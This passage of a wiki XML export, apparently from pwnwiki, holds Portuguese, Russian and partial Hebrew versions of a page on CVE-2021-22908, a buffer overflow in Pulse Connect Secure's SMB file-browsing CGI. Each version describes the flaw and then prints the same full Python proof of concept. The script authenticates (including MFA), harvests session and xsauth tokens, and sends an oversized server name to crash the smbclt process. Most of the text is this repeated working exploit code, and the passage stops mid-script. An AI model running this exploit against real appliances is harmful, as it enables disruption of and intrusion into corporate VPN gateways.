        'v': '%s,,' % ('A' * 1800),
        'dir': 'tmp',
        'si': None,
        'ri': None,
        'pi': None,
        'confirm': 'yes',
        'folder': 'tmp',
        'acttype': 'create',
        'xsauth': xsauth,
        'create': 'Create Folder',
        }
    cookies = {'DSID': dsid}
    try:
        res = requests.post(url, data=values, verify=False, allow_redirects=False, cookies=cookies, timeout=60)
        status = res.status_code
        if 'DSIDFormDataStr' in str(res.content):
            # We got page asking to confirm our action
            print('xsauth value was not accepted')
        else:
            if status == 200 and 'Error FB-8' in str(res.content):
                print('HTTP %s.  Windows File Access Policies prevents exploitation.' % status)
            elif status == 200:
                print('HTTP %s.  Not vulnerable.' % status)
            elif status == 403:
                print('HTTP %s.  XML workaround applied.' % status)
            elif status == 500:
                print('HTTP %s.  %s is vulnerable to CVE-2021-22908!' % (status, host))
            elif status == 302:
                print('HTTP %s.  Are you sure your DSID is valid?' % host)
            else:
                print('HTTP %s.  Not sure how to interpret this result.' % status)
    except requests.exceptions.ReadTimeout:
        print('No response from server. Try again...')


def get_default(host):
    url = 'https://%s' % host
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    try:
        location = res.headers['location']
        if 'dana-na' not in location:
            print('%s does not seem to be a PCS host' % host)
            location = None
    except:
        pass
    return location

def check_xml(host):
    url = 'https://%s/dana/meeting' % host
    #print('Checking status of %s ...' % url)
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    if res.status_code == 403:
        print('Workaround-2104 appears to be installed')
    else:
        print('Workaround-2104 does NOT seem to be installed. Hope you are on R11.4 or later!')

    url = 'https://%s/dana-cached/fb/smb/wfmd.cgi' % host
    #print('Checking status of %s ...' % url)
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    if res.status_code == 403:
        print('Workaround-2105 appears to be installed')
    else:
        print('Workaround-2105 does NOT seem to be installed. Hope you are on R11.5 or later!')


host = args.host
if args.noauth:
    check_xml(host)
else:
    defaulturi = get_default(host)
    if defaulturi:

        if not args.realm:
            realm = get_realm(host, defaulturi)
        else:
            realm = args.realm

        if realm:
            print('Realm: %s' % realm)
            if not args.user and not args.dsid:
                user = input('User: ')
            else:
                user = args.user
            if not args.password and not args.dsid:
                password = getpass.getpass()
            else:
                password = args.password
            if not args.dsid:
                dsid = get_dsid(host, defaulturi, realm, user, password)
                print('DSID: %s' % dsid)
            else:
                dsid = args.dsid
            if dsid:
                if not args.xsauth:
                    xsauth = get_xsauth(host, dsid)
                    print('xsauth: %s' % xsauth)
                else:
                    xsauth = args.xsauth
                if xsauth:
                    trigger_vul(host, dsid, xsauth)
&lt;/pre&gt;

== הפניה ==
https://short.pwnwiki.org/?c=1NiPen

https://short.pwnwiki.org/?c=2Um6Rb</text>
      <sha1>aq51tjgrmaxzj1tsu9or2y87pqp6w88</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22908 Pulse Connect Secure 任意代碼執行漏洞/pt</title>
    <ns>0</ns>
    <id>3452</id>
    <revision>
      <id>4018</id>
      <timestamp>2021-06-04T02:17:25Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Descrição da vulnerabilidade =="</comment>
      <origin>4018</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="12079" sha1="d75ynyy6g19zjej5n29wlrzbdvvk6s1" xml:space="preserve">&lt;languages  /&gt;
== Descrição da vulnerabilidade ==

Como o PCS oferece suporte à conexão com o compartilhamento de arquivos do Windows (SMB), a função é fornecida por scripts CGI baseados nas bibliotecas Samba 4.5.10 e aplicativos auxiliares. Ao especificar um nome de servidor longo para certas operações SMB, o aplicativo smbclt pode travar devido ao estouro do buffer, dependendo do comprimento do nome do servidor especificado.

Foi confirmado que o sistema PCS 9.1R11.4 tem esta vulnerabilidade. O endpoint CGI alvo é &lt;code&gt;/dana/fb/smb/wnf.cgi &lt;/code&gt;. Outros endpoints CGI também podem desencadear esta vulnerabilidade.

Se um invasor não conseguir limpar depois de explorar com êxito esta vulnerabilidade, especificar um nome de servidor longo pode resultar nas seguintes entradas de log de eventos PCS:
&lt;pre&gt;
Critical ERR31093 2021-05-24 14:05:37 - ive - [127.0.0.1] Root::System()[] - Program smbclt recently failed.
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
但要利用此漏洞，PCS服務器必須有一個允許\\*的Windows文件訪問策略或允許攻擊者連接到任意服務器的其他策略。可以在PCS的管理頁面中，查看用戶-&gt;資源策略-&gt;Windows 文件訪問策略，來查看當前的SMB策略。9.1R2及之前的PCS設備使用允許連接到任意SMB主機的默認策略，從9.1R3開始，這個策略從默認允許更改為默認拒絕。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==影響範圍==
&lt;/div&gt;
Pulse Connect Secure 9.0RX and 9.1RX

==POC==
&lt;pre&gt;
#!/usr/bin/env python3
# Utility to check for Pulse Connect Secure CVE-2021-22908
# https://www.kb.cert.org/vuls/id/667933

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import argparse
import sys
from html.parser import HTMLParser
import getpass

parser = argparse.ArgumentParser(description='Pulse Connect Secure CVE-2021-22908')
parser.add_argument('host', type=str, help='PCS IP or hostname)')
parser.add_argument('-u', '--user', dest='user', type=str, help='username')
parser.add_argument('-p', '--pass', dest='password', type=str, help='password')
parser.add_argument('-r', '--realm', dest='realm', type=str, help='realm')
parser.add_argument('-d', '--dsid', dest='dsid', type=str, help='DSID')
parser.add_argument('-x', '--xsauth', dest='xsauth', type=str, help='xsauth')
parser.add_argument('-n', '--noauth', action='store_true', help='Do not authenticate. Only check for XML workaround')

args = parser.parse_args()

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class formvaluefinder(HTMLParser):
    def __init__(self, searchval):
        super(type (self), self).__init__()
        self.searchval = searchval
    def handle_starttag(self, tag, attrs):
        if tag == 'input':
            # We're just looking for form &lt;input&gt; tags
            foundelement = False
            for attr in attrs:
                if(attr[0] == 'name'):
                    if(attr[1] == self.searchval):
                        foundelement = True
                elif(attr[0] == 'value' and foundelement == True):
                     self.data = attr[1]

class preauthfinder(HTMLParser):
    foundelement = False
    def handle_starttag(self, tag, attrs):
        if tag == 'textarea':
            # We're just looking for &lt;textarea&gt; tags
            foundelement = False
            for attr in attrs:
                if(attr[0] == 'id'):
                    if(attr[1] == 'sn-preauth-text_2'):
                        self.foundelement = True
    def handle_data(self, data):
        if self.foundelement:
            self.data = data
            self.foundelement = False



def get_realm(host, defaulturi):
    realm = None
    print('Getting default realm for %s...' % host)
    url = 'https://%s%s' % (host,defaulturi)
    res = None
    try:
        res = requests.get(url, verify=False, timeout=10)
    except requests.exceptions.ConnectionError:
        print('Error retrieving %s' % url)

    if res:
        if res.status_code == 200:
            html = str(res.content)
            if 'sn-preauth-text_2' in html:
                print('Preauth required...')
                parser = preauthfinder()
                parser.feed(html)
                preauthtext = parser.data
                values = {'sn-preauth-text': preauthtext, 'sn-preauth-proceed': 'Proceed'}
                res = requests.post(res.url, data=values, verify=False, allow_redirects=False, timeout=10)
                if res.content:
                    parser = formvaluefinder('realm')
                    parser.feed(str(res.content))
                    realm = parser.data
                else:
                    print('Error retrieving login page')

            else:
                parser = formvaluefinder('realm')
                parser.feed(html)
                realm = parser.data
    return realm

def get_dsid(host, defaulturi, realm, user, password):
    dsid = None
    loginuri = defaulturi.replace('welcome.cgi', 'login.cgi')
    url = 'https://%s%s' % (host,loginuri)
    values = {'username': user, 'password': password, 'realm': realm, 'btnSubmit': 'Sign In'}
    res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
    if 'confirm' in res.headers['location']:
        # Redirect to "user-confirm" that they still want to log in, despite already
        # having an active session
        print('User session is already active! Proceeding...')
        res = requests.post(url, data=values, verify=False, allow_redirects=True, timeout=10)
        parser = formvaluefinder('FormDataStr')
        parser.feed(str(res.content))
        formdata = parser.data
        values = {'btnContinue' : 'Continue the session', 'FormDataStr': formdata}
        res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
        for cookie in res.cookies:
            if cookie.name == 'DSID':
                dsid = cookie.value
    elif 'cred' in res.headers['location']:
        # This is a pulse that requires 2FA
        res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
        for cookie in res.cookies:
            if cookie.name == 'id':
                key = cookie.value
        password2 = input('MFA code: ')
        values = {'key': key, 'password#2': password2, 'btnSubmit': 'Sign In'}
        cookies = {'id': key, 'DSSigninNotif': '1'}
        res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=False, timeout=10)
        if 'confirm' in res.headers['location']:
            # Redirect to "user-confirm" that they still want to log in, despite already
            # having an active session
            print('User session is already active! Proceeding...')
            res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=True, timeout=10)
            parser = formvaluefinder('FormDataStr')
            parser.feed(str(res.content))
            formdata = parser.data
            values = {'btnContinue' : 'Continue the session', 'FormDataStr': formdata}
            res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=False, timeout=10)
            for cookie in res.cookies:
                if cookie.name == 'DSID':
                    dsid = cookie.value
        else:
            for cookie in res.cookies:
                if cookie.name == 'DSID':
                    dsid = cookie.value
    elif 'failed' in res.headers['location']:
        print('Login failed!')
    else:
        # Login accepted
        for cookie in res.cookies:
            if cookie.name == 'DSID':
                dsid = cookie.value

    return dsid


def get_xsauth(host, dsid):
    xsauth = None
    url = 'https://%s/dana/home/index.cgi' % host
    cookies = {'DSID':dsid}
    res = requests.get(url, verify=False, cookies=cookies, timeout=10)
    if 'xsauth' in str(res.content):
        parser = formvaluefinder('xsauth')
        parser.feed(str(res.content))
        xsauth = parser.data
    else:
        print('Cannot find xsauth string for provided DSID: %s' % dsid)
    return xsauth

def trigger_vul(host, dsid, xsauth):
    url = 'https://%s/dana/fb/smb/wnf.cgi' % host
    values = {
        't': 's',
        'v': '%s,,' % ('A' * 1800),
        'dir': 'tmp',
        'si': None,
        'ri': None,
        'pi': None,
        'confirm': 'yes',
        'folder': 'tmp',
        'acttype': 'create',
        'xsauth': xsauth,
        'create': 'Create Folder',
        }
    cookies = {'DSID': dsid}
    try:
        res = requests.post(url, data=values, verify=False, allow_redirects=False, cookies=cookies, timeout=60)
        status = res.status_code
        if 'DSIDFormDataStr' in str(res.content):
            # We got page asking to confirm our action
            print('xsauth value was not accepted')
        else:
            if status == 200 and 'Error FB-8' in str(res.content):
                print('HTTP %s.  Windows File Access Policies prevents exploitation.' % status)
            elif status == 200:
                print('HTTP %s.  Not vulnerable.' % status)
            elif status == 403:
                print('HTTP %s.  XML workaround applied.' % status)
            elif status == 500:
                print('HTTP %s.  %s is vulnerable to CVE-2021-22908!' % (status, host))
            elif status == 302:
                print('HTTP %s.  Are you sure your DSID is valid?' % host)
            else:
                print('HTTP %s.  Not sure how to interpret this result.' % status)
    except requests.exceptions.ReadTimeout:
        print('No response from server. Try again...')


def get_default(host):
    url = 'https://%s' % host
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    try:
        location = res.headers['location']
        if 'dana-na' not in location:
            print('%s does not seem to be a PCS host' % host)
            location = None
    except:
        pass
    return location

def check_xml(host):
    url = 'https://%s/dana/meeting' % host
    #print('Checking status of %s ...' % url)
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    if res.status_code == 403:
        print('Workaround-2104 appears to be installed')
    else:
        print('Workaround-2104 does NOT seem to be installed. Hope you are on R11.4 or later!')

    url = 'https://%s/dana-cached/fb/smb/wfmd.cgi' % host
    #print('Checking status of %s ...' % url)
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    if res.status_code == 403:
        print('Workaround-2105 appears to be installed')
    else:
        print('Workaround-2105 does NOT seem to be installed. Hope you are on R11.5 or later!')


host = args.host
if args.noauth:
    check_xml(host)
else:
    defaulturi = get_default(host)
    if defaulturi:

        if not args.realm:
            realm = get_realm(host, defaulturi)
        else:
            realm = args.realm

        if realm:
            print('Realm: %s' % realm)
            if not args.user and not args.dsid:
                user = input('User: ')
            else:
                user = args.user
            if not args.password and not args.dsid:
                password = getpass.getpass()
            else:
                password = args.password
            if not args.dsid:
                dsid = get_dsid(host, defaulturi, realm, user, password)
                print('DSID: %s' % dsid)
            else:
                dsid = args.dsid
            if dsid:
                if not args.xsauth:
                    xsauth = get_xsauth(host, dsid)
                    print('xsauth: %s' % xsauth)
                else:
                    xsauth = args.xsauth
                if xsauth:
                    trigger_vul(host, dsid, xsauth)
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==參考==
&lt;/div&gt;
https://short.pwnwiki.org/?c=1NiPen

https://short.pwnwiki.org/?c=2Um6Rb</text>
      <sha1>d75ynyy6g19zjej5n29wlrzbdvvk6s1</sha1>
    </revision>
    <revision>
      <id>4023</id>
      <parentid>4018</parentid>
      <timestamp>2021-06-04T02:18:38Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "Como o PCS oferece suporte à conexão com o compartilhamento de arquivos do Windows (SMB), a função é fornecida por scripts CGI baseados nas bibliotecas Samba 4.5.10 e apl..."</comment>
      <origin>4023</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="12075" sha1="4q65d8rj0mwq34rdwbu95oagevz44uw" xml:space="preserve">&lt;languages  /&gt;
== Descrição da vulnerabilidade ==

Como o PCS oferece suporte à conexão com o compartilhamento de arquivos do Windows (SMB), a função é fornecida por scripts CGI baseados nas bibliotecas Samba 4.5.10 e aplicativos auxiliares. Ao especificar um nome de servidor longo para certas operações SMB, o aplicativo smbclt pode travar devido ao estouro do buffer, dependendo do comprimento do nome do servidor especificado.

Foi confirmado que o sistema PCS 9.1R11.4 tem esta vulnerabilidade. O endpoint CGI alvo é &lt;code&gt;/dana/fb/smb/wnf.cgi &lt;/code&gt;. Outros endpoints CGI também podem desencadear esta vulnerabilidade.

Se um invasor não conseguir limpar depois de explorar com êxito esta vulnerabilidade, especificar um nome de servidor longo pode resultar nas seguintes entradas de log de eventos PCS:
&lt;pre&gt;
Critical ERR31093 2021-05-24 14:05:37 - ive - [127.0.0.1] Root::System()[] - Program smbclt recently failed.
&lt;/pre&gt;

Mas para explorar esta vulnerabilidade, o servidor PCS deve ter uma política de acesso a arquivos do Windows que permita \\ * ou outra política que permita que um invasor se conecte a qualquer servidor. Você pode visualizar a política SMB atual visualizando Usuário-&gt; Política de Recursos-&gt; Política de Acesso a Arquivos do Windows na página de gerenciamento do PCS. 9.1R2 e dispositivos PCS anteriores usam a política padrão de permitir conexões com qualquer host SMB. A partir de 9.1R3, esta política foi alterada da permissão padrão para a rejeição padrão.

== Âmbito de influência ==
Pulse Connect Secure 9.0RX and 9.1RX

==POC==
&lt;pre&gt;
#!/usr/bin/env python3
# Utility to check for Pulse Connect Secure CVE-2021-22908
# https://www.kb.cert.org/vuls/id/667933

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import argparse
import sys
from html.parser import HTMLParser
import getpass

parser = argparse.ArgumentParser(description='Pulse Connect Secure CVE-2021-22908')
parser.add_argument('host', type=str, help='PCS IP or hostname)')
parser.add_argument('-u', '--user', dest='user', type=str, help='username')
parser.add_argument('-p', '--pass', dest='password', type=str, help='password')
parser.add_argument('-r', '--realm', dest='realm', type=str, help='realm')
parser.add_argument('-d', '--dsid', dest='dsid', type=str, help='DSID')
parser.add_argument('-x', '--xsauth', dest='xsauth', type=str, help='xsauth')
parser.add_argument('-n', '--noauth', action='store_true', help='Do not authenticate. Only check for XML workaround')

args = parser.parse_args()

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class formvaluefinder(HTMLParser):
    def __init__(self, searchval):
        super(type (self), self).__init__()
        self.searchval = searchval
    def handle_starttag(self, tag, attrs):
        if tag == 'input':
            # We're just looking for form &lt;input&gt; tags
            foundelement = False
            for attr in attrs:
                if(attr[0] == 'name'):
                    if(attr[1] == self.searchval):
                        foundelement = True
                elif(attr[0] == 'value' and foundelement == True):
                     self.data = attr[1]

class preauthfinder(HTMLParser):
    foundelement = False
    def handle_starttag(self, tag, attrs):
        if tag == 'textarea':
            # We're just looking for &lt;textarea&gt; tags
            foundelement = False
            for attr in attrs:
                if(attr[0] == 'id'):
                    if(attr[1] == 'sn-preauth-text_2'):
                        self.foundelement = True
    def handle_data(self, data):
        if self.foundelement:
            self.data = data
            self.foundelement = False



def get_realm(host, defaulturi):
    realm = None
    print('Getting default realm for %s...' % host)
    url = 'https://%s%s' % (host,defaulturi)
    res = None
    try:
        res = requests.get(url, verify=False, timeout=10)
    except requests.exceptions.ConnectionError:
        print('Error retrieving %s' % url)

    if res:
        if res.status_code == 200:
            html = str(res.content)
            if 'sn-preauth-text_2' in html:
                print('Preauth required...')
                parser = preauthfinder()
                parser.feed(html)
                preauthtext = parser.data
                values = {'sn-preauth-text': preauthtext, 'sn-preauth-proceed': 'Proceed'}
                res = requests.post(res.url, data=values, verify=False, allow_redirects=False, timeout=10)
                if res.content:
                    parser = formvaluefinder('realm')
                    parser.feed(str(res.content))
                    realm = parser.data
                else:
                    print('Error retrieving login page')

            else:
                parser = formvaluefinder('realm')
                parser.feed(html)
                realm = parser.data
    return realm

def get_dsid(host, defaulturi, realm, user, password):
    dsid = None
    loginuri = defaulturi.replace('welcome.cgi', 'login.cgi')
    url = 'https://%s%s' % (host,loginuri)
    values = {'username': user, 'password': password, 'realm': realm, 'btnSubmit': 'Sign In'}
    res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
    if 'confirm' in res.headers['location']:
        # Redirect to "user-confirm" that they still want to log in, despite already
        # having an active session
        print('User session is already active! Proceeding...')
        res = requests.post(url, data=values, verify=False, allow_redirects=True, timeout=10)
        parser = formvaluefinder('FormDataStr')
        parser.feed(str(res.content))
        formdata = parser.data
        values = {'btnContinue' : 'Continue the session', 'FormDataStr': formdata}
        res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
        for cookie in res.cookies:
            if cookie.name == 'DSID':
                dsid = cookie.value
    elif 'cred' in res.headers['location']:
        # This is a pulse that requires 2FA
        res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
        for cookie in res.cookies:
            if cookie.name == 'id':
                key = cookie.value
        password2 = input('MFA code: ')
        values = {'key': key, 'password#2': password2, 'btnSubmit': 'Sign In'}
        cookies = {'id': key, 'DSSigninNotif': '1'}
        res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=False, timeout=10)
        if 'confirm' in res.headers['location']:
            # Redirect to "user-confirm" that they still want to log in, despite already
            # having an active session
            print('User session is already active! Proceeding...')
            res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=True, timeout=10)
            parser = formvaluefinder('FormDataStr')
            parser.feed(str(res.content))
            formdata = parser.data
            values = {'btnContinue' : 'Continue the session', 'FormDataStr': formdata}
            res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=False, timeout=10)
            for cookie in res.cookies:
                if cookie.name == 'DSID':
                    dsid = cookie.value
        else:
            for cookie in res.cookies:
                if cookie.name == 'DSID':
                    dsid = cookie.value
    elif 'failed' in res.headers['location']:
        print('Login failed!')
    else:
        # Login accepted
        for cookie in res.cookies:
            if cookie.name == 'DSID':
                dsid = cookie.value

    return dsid


def get_xsauth(host, dsid):
    xsauth = None
    url = 'https://%s/dana/home/index.cgi' % host
    cookies = {'DSID':dsid}
    res = requests.get(url, verify=False, cookies=cookies, timeout=10)
    if 'xsauth' in str(res.content):
        parser = formvaluefinder('xsauth')
        parser.feed(str(res.content))
        xsauth = parser.data
    else:
        print('Cannot find xsauth string for provided DSID: %s' % dsid)
    return xsauth

def trigger_vul(host, dsid, xsauth):
    url = 'https://%s/dana/fb/smb/wnf.cgi' % host
    values = {
        't': 's',
        'v': '%s,,' % ('A' * 1800),
        'dir': 'tmp',
        'si': None,
        'ri': None,
        'pi': None,
        'confirm': 'yes',
        'folder': 'tmp',
        'acttype': 'create',
        'xsauth': xsauth,
        'create': 'Create Folder',
        }
    cookies = {'DSID': dsid}
    try:
        res = requests.post(url, data=values, verify=False, allow_redirects=False, cookies=cookies, timeout=60)
        status = res.status_code
        if 'DSIDFormDataStr' in str(res.content):
            # We got page asking to confirm our action
            print('xsauth value was not accepted')
        else:
            if status == 200 and 'Error FB-8' in str(res.content):
                print('HTTP %s.  Windows File Access Policies prevents exploitation.' % status)
            elif status == 200:
                print('HTTP %s.  Not vulnerable.' % status)
            elif status == 403:
                print('HTTP %s.  XML workaround applied.' % status)
            elif status == 500:
                print('HTTP %s.  %s is vulnerable to CVE-2021-22908!' % (status, host))
            elif status == 302:
                print('HTTP %s.  Are you sure your DSID is valid?' % host)
            else:
                print('HTTP %s.  Not sure how to interpret this result.' % status)
    except requests.exceptions.ReadTimeout:
        print('No response from server. Try again...')


def get_default(host):
    url = 'https://%s' % host
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    try:
        location = res.headers['location']
        if 'dana-na' not in location:
            print('%s does not seem to be a PCS host' % host)
            location = None
    except:
        pass
    return location

def check_xml(host):
    url = 'https://%s/dana/meeting' % host
    #print('Checking status of %s ...' % url)
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    if res.status_code == 403:
        print('Workaround-2104 appears to be installed')
    else:
        print('Workaround-2104 does NOT seem to be installed. Hope you are on R11.4 or later!')

    url = 'https://%s/dana-cached/fb/smb/wfmd.cgi' % host
    #print('Checking status of %s ...' % url)
    res = requests.get(url, verify=False, allow_redirects=False, timeout=10)
    if res.status_code == 403:
        print('Workaround-2105 appears to be installed')
    else:
        print('Workaround-2105 does NOT seem to be installed. Hope you are on R11.5 or later!')


host = args.host
if args.noauth:
    check_xml(host)
else:
    defaulturi = get_default(host)
    if defaulturi:

        if not args.realm:
            realm = get_realm(host, defaulturi)
        else:
            realm = args.realm

        if realm:
            print('Realm: %s' % realm)
            if not args.user and not args.dsid:
                user = input('User: ')
            else:
                user = args.user
            if not args.password and not args.dsid:
                password = getpass.getpass()
            else:
                password = args.password
            if not args.dsid:
                dsid = get_dsid(host, defaulturi, realm, user, password)
                print('DSID: %s' % dsid)
            else:
                dsid = args.dsid
            if dsid:
                if not args.xsauth:
                    xsauth = get_xsauth(host, dsid)
                    print('xsauth: %s' % xsauth)
                else:
                    xsauth = args.xsauth
                if xsauth:
                    trigger_vul(host, dsid, xsauth)
&lt;/pre&gt;

== Referência ==
https://short.pwnwiki.org/?c=1NiPen

https://short.pwnwiki.org/?c=2Um6Rb</text>
      <sha1>4q65d8rj0mwq34rdwbu95oagevz44uw</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-22908 Pulse Connect Secure 任意代碼執行漏洞/ru</title>
    <ns>0</ns>
    <id>3408</id>
    <revision>
      <id>3973</id>
      <timestamp>2021-06-04T01:57:48Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Описание уязвимости =="</comment>
      <origin>3973</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="13081" sha1="mfs6ljbmsnf5y4fy9vos9jdhw1x66il" xml:space="preserve">&lt;languages  /&gt;
== Описание уязвимости ==

Поскольку PCS поддерживает соединение с общим доступом к файлам Windows (SMB), эта функция обеспечивается сценариями CGI, основанными на библиотеках Samba 4.5.10 и вспомогательных приложениях. При указании длинного имени сервера для определенных операций SMB приложение smbclt может аварийно завершить работу из-за переполнения буфера, в зависимости от длины указанного имени сервера.

Было подтверждено, что система PCS 9.1R11.4 имеет эту уязвимость. Целевая конечная точка CGI - &lt;code&gt;/dana/fb/smb/wnf.cgi&lt;/code&gt;. Другие конечные точки CGI также могут вызывать эту уязвимость.

Если злоумышленнику не удается выполнить очистку после успешного использования этой уязвимости, указание длинного имени сервера может привести к появлению следующих записей журнала событий PCS:
&lt;pre&gt;
Critical ERR31093 2021-05-24 14:05:37 - ive - [127.0.0.1] Root::System()[] - Program smbclt recently failed.
&lt;/pre&gt;

Но для использования этой уязвимости на сервере PCS должна быть политика доступа к файлам Windows, разрешающая \\ *, или другая политика, позволяющая злоумышленнику подключаться к любому серверу. Вы можете просмотреть текущую политику SMB, просмотрев Пользователь-&gt; Политика ресурсов-&gt; Политика доступа к файлам Windows на странице управления PCS. Устройства PCS версии 9.1R2 и более ранних используют политику по умолчанию, разрешающую подключения к любому узлу SMB. Начиная с 9.1R3, эта политика была изменена с разрешения по умолчанию на отклонение по умолчанию.

== Сфера влияния ==
Pulse Connect Secure 9.0RX and 9.1RX

==POC==
&lt;pre&gt;
#!/usr/bin/env python3
# Utility to check for Pulse Connect Secure CVE-2021-22908
# https://www.kb.cert.org/vuls/id/667933

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import argparse
import sys
from html.parser import HTMLParser
import getpass

parser = argparse.ArgumentParser(description='Pulse Connect Secure CVE-2021-22908')
parser.add_argument('host', type=str, help='PCS IP or hostname)')
parser.add_argument('-u', '--user', dest='user', type=str, help='username')
parser.add_argument('-p', '--pass', dest='password', type=str, help='password')
parser.add_argument('-r', '--realm', dest='realm', type=str, help='realm')
parser.add_argument('-d', '--dsid', dest='dsid', type=str, help='DSID')
parser.add_argument('-x', '--xsauth', dest='xsauth', type=str, help='xsauth')
parser.add_argument('-n', '--noauth', action='store_true', help='Do not authenticate. Only check for XML workaround')

args = parser.parse_args()

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class formvaluefinder(HTMLParser):
    def __init__(self, searchval):
        super(type (self), self).__init__()
        self.searchval = searchval
    def handle_starttag(self, tag, attrs):
        if tag == 'input':
            # We're just looking for form &lt;input&gt; tags
            foundelement = False
            for attr in attrs:
                if(attr[0] == 'name'):
                    if(attr[1] == self.searchval):
                        foundelement = True
                elif(attr[0] == 'value' and foundelement == True):
                     self.data = attr[1]

class preauthfinder(HTMLParser):
    foundelement = False
    def handle_starttag(self, tag, attrs):
        if tag == 'textarea':
            # We're just looking for &lt;textarea&gt; tags
            foundelement = False
            for attr in attrs:
                if(attr[0] == 'id'):
                    if(attr[1] == 'sn-preauth-text_2'):
                        self.foundelement = True
    def handle_data(self, data):
        if self.foundelement:
            self.data = data
            self.foundelement = False



def get_realm(host, defaulturi):
    realm = None
    print('Getting default realm for %s...' % host)
    url = 'https://%s%s' % (host,defaulturi)
    res = None
    try:
        res = requests.get(url, verify=False, timeout=10)
    except requests.exceptions.ConnectionError:
        print('Error retrieving %s' % url)

    if res:
        if res.status_code == 200:
            html = str(res.content)
            if 'sn-preauth-text_2' in html:
                print('Preauth required...')
                parser = preauthfinder()
                parser.feed(html)
                preauthtext = parser.data
                values = {'sn-preauth-text': preauthtext, 'sn-preauth-proceed': 'Proceed'}
                res = requests.post(res.url, data=values, verify=False, allow_redirects=False, timeout=10)
                if res.content:
                    parser = formvaluefinder('realm')
                    parser.feed(str(res.content))
                    realm = parser.data
                else:
                    print('Error retrieving login page')

            else:
                parser = formvaluefinder('realm')
                parser.feed(html)
                realm = parser.data
    return realm

def get_dsid(host, defaulturi, realm, user, password):
    dsid = None
    loginuri = defaulturi.replace('welcome.cgi', 'login.cgi')
    url = 'https://%s%s' % (host,loginuri)
    values = {'username': user, 'password': password, 'realm': realm, 'btnSubmit': 'Sign In'}
    res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
    if 'confirm' in res.headers['location']:
        # Redirect to "user-confirm" that they still want to log in, despite already
        # having an active session
        print('User session is already active! Proceeding...')
        res = requests.post(url, data=values, verify=False, allow_redirects=True, timeout=10)
        parser = formvaluefinder('FormDataStr')
        parser.feed(str(res.content))
        formdata = parser.data
        values = {'btnContinue' : 'Continue the session', 'FormDataStr': formdata}
        res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
        for cookie in res.cookies:
            if cookie.name == 'DSID':
                dsid = cookie.value
    elif 'cred' in res.headers['location']:
        # This is a pulse that requires 2FA
        res = requests.post(url, data=values, verify=False, allow_redirects=False, timeout=10)
        for cookie in res.cookies:
            if cookie.name == 'id':
                key = cookie.value
        password2 = input('MFA code: ')
        values = {'key': key, 'password#2': password2, 'btnSubmit': 'Sign In'}
        cookies = {'id': key, 'DSSigninNotif': '1'}
        res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=False, timeout=10)
        if 'confirm' in res.headers['location']:
            # Redirect to "user-confirm" that they still want to log in, despite already
            # having an active session
            print('User session is already active! Proceeding...')
            res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=True, timeout=10)
            parser = formvaluefinder('FormDataStr')
            parser.feed(str(res.content))
            formdata = parser.data
            values = {'btnContinue' : 'Continue the session', 'FormDataStr': formdata}
            res = requests.post(url, data=values, cookies=cookies, verify=False, allow_redirects=False, timeout=10)
            for cookie in res.cookies:
                if cookie.name == 'DSID':
                    dsid = cookie.value
        else:
            for cookie in res.cookies:
                if cookie.name == 'DSID':
                    dsid = cookie.value
    elif 'failed' in res.headers['location']:
        print('Login failed!')
    else:
        # Login accepted
        for cookie in res.cookies:
            if cookie.name == 'DSID':
                dsid = cookie.value

    return dsid


def get_xsauth(host, dsid):
    xsauth = None
    url = 'https://%s/dana/home/index.cgi' % host
    cookies = {'DSID':dsid}
    res = requests.get(url, verify=False, cookies=cookies, timeout=10)
    if 'xsauth' in str(res.content):
        parser = formvaluefinder('xsauth')
        parser.feed(str(res.content))
        xsauth = parser.data
    else:
        print('Cannot find xsauth string for provided DSID: %s' % dsid)
    return xsauth

def trigger_vul(host, dsid, xsauth):
    url = 'https://%s/dana/fb/smb/wnf.cgi' % host
    values = {
        't': 's',
        'v': '%s,,' % ('A' * 1800),
        'dir': 'tmp',
        'si': None,
        'ri': None,
        'pi': None,
        'confirm': 'yes',
        'folder': 'tmp',
